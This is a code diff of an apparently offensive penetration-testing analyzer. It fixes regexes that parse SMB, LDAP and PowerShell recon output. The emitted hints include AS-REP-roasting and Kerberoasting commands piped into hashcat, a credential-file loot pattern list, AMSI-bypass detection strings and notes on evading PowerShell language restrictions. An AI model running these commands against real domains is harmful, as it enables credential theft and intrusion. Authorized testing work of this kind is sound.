@@ -2218,8 +2218,14 @@ _SMB_LOOT_FILENAMES = (
     r'secret(?:s)?\.(?:txt|xlsx|xls|csv|docx?)|'
     r'backup(?:s)?\.(?:zip|tar|gz|7z|rar|tar\.gz|sql)|'
     r'unattend\.(?:xml|txt)|Autounattend\.xml|sysprep\.(?:xml|inf)|'
-    r'\w+\.kdbx|\w+\.pfx|\w+\.p12|\w+\.jks|\w+\.pem|\w+\.key|'
-    r'\w+\.kirbi|\w+\.ccache|\w+\.keytab|'
+    # iter-249 audit fix: `\w+\.` doesn't match hyphens in filenames.
+    # Real loot names like `corp-vault.kdbx`, `web-cert.pfx`,
+    # `server-key.pem` never matched. Extended char class to
+    # `[\w.\-]+` to accept hyphens (safe because we still require
+    # the extension literal after the dot).
+    r'[\w.\-]+\.kdbx|[\w.\-]+\.pfx|[\w.\-]+\.p12|[\w.\-]+\.jks|'
+    r'[\w.\-]+\.pem|[\w.\-]+\.key|'
+    r'[\w.\-]+\.kirbi|[\w.\-]+\.ccache|[\w.\-]+\.keytab|'
     r'id_rsa|id_ed25519|id_dsa|id_ecdsa|authorized_keys|known_hosts|'
     r'\.bash_history|\.zsh_history|\.psql_history|\.mysql_history|'
     r'wp-config\.php|web\.config|app\.config|config\.php|'
@@ -2260,12 +2266,15 @@ _PS_CLM_STATE = re.compile(
 # Presence of these = AMSI-bypass attempt captured, so the
 # operator's next AMSI-tickled command may still be blocked.
 _PS_AMSI_BYPASS = re.compile(
+    # iter-249 audit fix: `Marshal::WriteInt32` on its own is
+    # ordinary P/Invoke syntax and appears in legit C# / PS code.
+    # Removed the standalone alt; the AMSI-specific alts still
+    # match the diagnostic tokens uniquely.
     r'(?i)(?:'
     r'\[Ref\]\.Assembly\.GetType\s*\(\s*[\'"][^\'"]{20,80}Amsi[^\'"]{0,50}[\'"]\s*\)|'
     r'System\.Management\.Automation\.AmsiUtils|'
     r'AmsiScanBuffer|'
-    r'amsiInitFailed|'
-    r'\[System\.Runtime\.InteropServices\.Marshal\]::WriteInt32'
+    r'amsiInitFailed'
     r')'
 )
 # Signal C: known-BANNED offensive-framework strings. Detecting
@@ -2292,22 +2301,23 @@ _PS_FRAMEWORK_IOC = re.compile(
 # The UAC value's DONT_REQ_PREAUTH bit (0x400000) = AS-REP-roastable.
 # Kerberoastable via serviceprincipalname is also flagged.
 _LDAP_USER_BLOCK = re.compile(
-    # Intermediate lines must NOT start another `dn:` block - prevents
-    # cross-user span where user A's sAMAccountName gets paired with
-    # user B's userAccountControl. Negative-lookahead pattern from
-    # iter-224 SMB anon-share fix.
-    r'(?im)^dn:\s*CN=([^,\r\n]{1,60}),[^\r\n]{0,300}\r?\n'
-    r'(?:(?!dn:)[^\r\n]{0,300}\r?\n){0,20}?'
-    r'sAMAccountName:\s+([\w.\-$]{1,60})\s*\r?\n'
-    r'(?:(?!dn:)[^\r\n]{0,300}\r?\n){0,20}?'
-    r'userAccountControl:\s+(\d+)'
+    # iter-249 audit fix: prior regex enforced sAMAccountName BEFORE
+    # userAccountControl in the LDIF stream, but RFC 4511 doesn't
+    # constrain attribute ordering. Restructured to block-then-parse.
+    # Block body captures lines that DON'T start with `dn:` or blank -
+    # `[^\r\n]*` instead of `.*` to prevent DOTALL from swallowing
+    # newlines and merging blocks (initial `(?ims)` version did that).
+    r'(?im)^dn:\s*CN=(?P<cn>[^,\r\n]{1,60}),[^\r\n]{0,300}\r?\n'
+    r'(?P<body>(?:(?!^dn:)(?!^\s*$)[^\r\n]*\r?\n){1,50})'
 )
-_LDAP_SPN_BLOCK = re.compile(
-    r'(?im)^dn:\s*CN=[^,\r\n]{1,60},[^\r\n]{0,300}\r?\n'
-    r'(?:(?!dn:)[^\r\n]{0,300}\r?\n){0,20}?'
-    r'sAMAccountName:\s+([\w.\-$]{1,60})\s*\r?\n'
-    r'(?:(?!dn:)[^\r\n]{0,300}\r?\n){0,20}?'
-    r'servicePrincipalName:\s+([^\r\n]{5,200})'
+_LDAP_SAM_LINE = re.compile(
+    r'(?im)^sAMAccountName:\s+([\w.\-$]{1,60})'
+)
+_LDAP_UAC_LINE = re.compile(
+    r'(?im)^userAccountControl:\s+(\d+)'
+)
+_LDAP_SPN_LINE = re.compile(
+    r'(?im)^servicePrincipalName:\s+([^\r\n]{5,200})'
 )
 
 # iter-227: LDAP anonymous bind confirmed via rootDSE dump. On AD
@@ -3237,53 +3247,69 @@ def _multiline_passes(path, report, store):
                 _dc_ip_hoist = _hnmap_m.group(1)
             # Extract dn base from any `dn:` line to infer the domain
             # as a fallback (e.g., `DC=corp,DC=local` → corp.local).
+            # iter-249 audit fix: both inner search AND findall need
+            # (?i) - RFC 4514 doesn't specify case for attribute types
+            # so `dc=corp,dc=local` (lowercase) is equally valid.
             if _dom_hoist == "<domain>":
                 _dc_parts_m = re.search(
                     r'(?im)dn:[^\r\n]*?((?:DC=[^,\s\r\n]+,?)+)',
-                    text[:16384])
+                    text[:16384], re.IGNORECASE)
                 if _dc_parts_m:
                     _dc_parts = re.findall(
-                        r'DC=([\w\-]+)', _dc_parts_m.group(1))
+                        r'(?i)DC=([\w\-]+)', _dc_parts_m.group(1))
                     if _dc_parts:
                         _dom_hoist = ".".join(_dc_parts)
 
+            # iter-249 audit fix: block-then-parse for attribute-order
+            # independence. Prior impl required sAMAccountName BEFORE
+            # userAccountControl in the LDIF stream, missing entries
+            # where the DC printed them in the opposite order.
             _asrep_seen_h = set()
-            for _um in _LDAP_USER_BLOCK.finditer(text[:65536]):
-                _sam = _um.group(2).strip()
-                try:
-                    _uac = int(_um.group(3))
-                except (ValueError, TypeError):
-                    continue
-                if _uac & 0x400000 and _sam not in _asrep_seen_h:
-                    _asrep_seen_h.add(_sam)
-                    _sam_sh = _sam.replace("'", "'\\''")
-                    report.add("HIGH", "RECON", path, _ln(_um),
-                               f"AS-REP-eligible user (UAC "
-                               f"DONT_REQ_PREAUTH): {_sam}",
-                               hint=(f"impacket-GetNPUsers "
-                                     f"{_dom_hoist}/ -dc-ip "
-                                     f"{_dc_ip_hoist} -usersfile "
-                                     f"<(echo '{_sam_sh}') -request "
-                                     f"-no-pass 2>/dev/null | tee "
-                                     f"{_sam}.asrep  |  hashcat -m "
-                                     f"18200 {_sam}.asrep rockyou.txt "
-                                     f"-r rules/best64.rule"))
             _spn_seen_h = set()
-            for _sm in _LDAP_SPN_BLOCK.finditer(text[:65536]):
-                _sam_s = _sm.group(1).strip()
-                _spn = _sm.group(2).strip()[:80]
-                if _sam_s in _spn_seen_h:
+            for _um in _LDAP_USER_BLOCK.finditer(text[:65536]):
+                _body = _um.group("body")
+                _sam_m = _LDAP_SAM_LINE.search(_body)
+                if not _sam_m:
                     continue
-                _spn_seen_h.add(_sam_s)
-                report.add("HIGH", "RECON", path, _ln(_sm),
-                           f"Kerberoastable service account: {_sam_s} "
-                           f"(SPN: {_spn})",
-                           hint=(f"needs any-domain-user cred: "
-                                 f"impacket-GetUserSPNs {_dom_hoist}/"
-                                 f"<user>:<pw> -dc-ip {_dc_ip_hoist}"
-                                 f" -request -outputfile {_sam_s}.tgs"
-                                 f"  |  hashcat -m 13100 {_sam_s}.tgs "
-                                 f"rockyou.txt -r rules/best64.rule"))
+                _sam = _sam_m.group(1).strip()
+                # AS-REP eligibility via UAC bit.
+                _uac_m = _LDAP_UAC_LINE.search(_body)
+                if _uac_m:
+                    try:
+                        _uac = int(_uac_m.group(1))
+                    except (ValueError, TypeError):
+                        _uac = 0
+                    if _uac & 0x400000 and _sam not in _asrep_seen_h:
+                        _asrep_seen_h.add(_sam)
+                        _sam_sh = _sam.replace("'", "'\\''")
+                        report.add("HIGH", "RECON", path, _ln(_um),
+                                   f"AS-REP-eligible user (UAC "
+                                   f"DONT_REQ_PREAUTH): {_sam}",
+                                   hint=(f"impacket-GetNPUsers "
+                                         f"{_dom_hoist}/ -dc-ip "
+                                         f"{_dc_ip_hoist} -usersfile "
+                                         f"<(echo '{_sam_sh}') -request"
+                                         f" -no-pass 2>/dev/null | tee"
+                                         f" {_sam}.asrep  |  hashcat "
+                                         f"-m 18200 {_sam}.asrep "
+                                         f"rockyou.txt -r rules/"
+                                         f"best64.rule"))
+                # Kerberoastable via SPN attribute presence.
+                _spn_m = _LDAP_SPN_LINE.search(_body)
+                if _spn_m and _sam not in _spn_seen_h:
+                    _spn_seen_h.add(_sam)
+                    _spn = _spn_m.group(1).strip()[:80]
+                    report.add("HIGH", "RECON", path, _ln(_um),
+                               f"Kerberoastable service account: "
+                               f"{_sam} (SPN: {_spn})",
+                               hint=(f"needs any-domain-user cred: "
+                                     f"impacket-GetUserSPNs "
+                                     f"{_dom_hoist}/<user>:<pw> -dc-ip"
+                                     f" {_dc_ip_hoist} -request "
+                                     f"-outputfile {_sam}.tgs  |  "
+                                     f"hashcat -m 13100 {_sam}.tgs "
+                                     f"rockyou.txt -r rules/best64."
+                                     f"rule"))
 
     # iter-247: SMB share / Windows dir listing high-value files.
     # Emits HIGH per unique filename (capped at 10 per file) with
@@ -3341,7 +3367,8 @@ def _multiline_passes(path, report, store):
         _clm_m = _PS_CLM_STATE.search(text[:32768])
         if _clm_m:
             _mode = _clm_m.group(1)
-            if _mode.lower() == "constrainedlanguage":
+            _mode_l = _mode.lower()
+            if _mode_l == "constrainedlanguage":
                 report.add("MEDIUM", "RECON", path, _ln(_clm_m),
                            "PowerShell ConstrainedLanguage mode "
                            "detected - .NET member access + Add-Type "
@@ -3363,10 +3390,28 @@ def _multiline_passes(path, report, store):
                                  "csc.exe + Add-Type CLM-safe "
                                  "compile is BLOCKED; use "
                                  "windows/wine wrapper"))
-            else:
+            elif _mode_l == "fulllanguage":
                 report.add("INFO", "RECON", path, _ln(_clm_m),
                            f"PowerShell LanguageMode: {_mode} "
                            "(unrestricted; direct .NET works)")
+            else:
+                # iter-249 audit fix: NoLanguage and RestrictedLanguage
+                # are MORE restrictive than ConstrainedLanguage. Prior
+                # else-branch incorrectly labeled them as unrestricted.
+                # NoLanguage bans nearly everything (only param binding
+                # + expression evaluation); RestrictedLanguage bans
+                # variable assignment + most cmdlets.
+                report.add("HIGH", "RECON", path, _ln(_clm_m),
+                           f"PowerShell LanguageMode: {_mode} - "
+                           f"MORE restrictive than ConstrainedLanguage",
+                           hint=("very restricted execution - most "
+                                 "cmdlets and variable assignment "
+                                 "blocked; bypass paths that work in "
+                                 "CLM (signed binary + inline C#) "
+                                 "may fail here  |  next: dump "
+                                 "$ExecutionContext for the specific "
+                                 "restrictions; only trusted "
+                                 "PowerShell binaries can bypass"))
 
         _amsi_m = _PS_AMSI_BYPASS.search(text[:32768])
         if _amsi_m:
